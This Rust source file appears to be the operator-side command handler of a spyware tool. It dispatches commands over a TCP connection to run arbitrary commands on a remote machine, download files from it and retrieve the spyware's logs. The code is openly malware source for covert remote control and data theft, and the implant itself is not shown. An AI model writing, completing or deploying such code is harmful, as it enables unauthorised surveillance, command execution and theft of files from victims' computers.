use std::io::{Error, ErrorKind};
use std::net::TcpStream;
use structopt::StructOpt;

use crate::commands::{download_file, get_spyware_logs, run_command};

#[derive(StructOpt)]
#[structopt(name = "DownloadFileAction")]
struct DownloadFileAction {
    /// Remote path of file to download
    remote_path: String,
    /// Local path to save file after download
    local_path: String,
}

fn print_general_help() {
    println!("Enter the required action, to get specific help. Options: ");
    println!("run - run a command");
    println!("download - download a remote file");
    println!("help - show this help command");
    println!("get_logs - get logs from the spyware");
    println!("exit - exit the CLI");
}

pub fn handle_user_command(user_command: &str, stream: &mut TcpStream) -> Result<(), Error> {
    let keywords: Vec<&str> = user_command.split_whitespace().collect();
    match keywords[0] {
        "exit" => {
            return Err(Error::new(ErrorKind::InvalidInput, "User typed exit"));
        }
        "help" => {
            print_general_help();
        }
        "run" => {
            if keywords.len() < 2 || keywords[1] == "-h" || keywords[1] == "--help" {
                print_general_help();
            } else {
                let command_to_execute = keywords[1..].join(" ");
                run_command(command_to_execute, stream).expect("Error while running command");
            }
        }
        "download" => {
            match DownloadFileAction::from_iter_safe(&keywords) {
                Ok(action) => {
                    download_file(action.remote_path, action.local_path, stream);
                }
                Err(e) => {
                    // This will print help message
                    println!("{}", e.message);
                }
            }
        }
        "get_logs" => {
            get_spyware_logs(stream);
        }
        _ => {
            if !keywords[0].is_empty() {
                print_general_help();
            }
        }
    }
    Ok(())
}
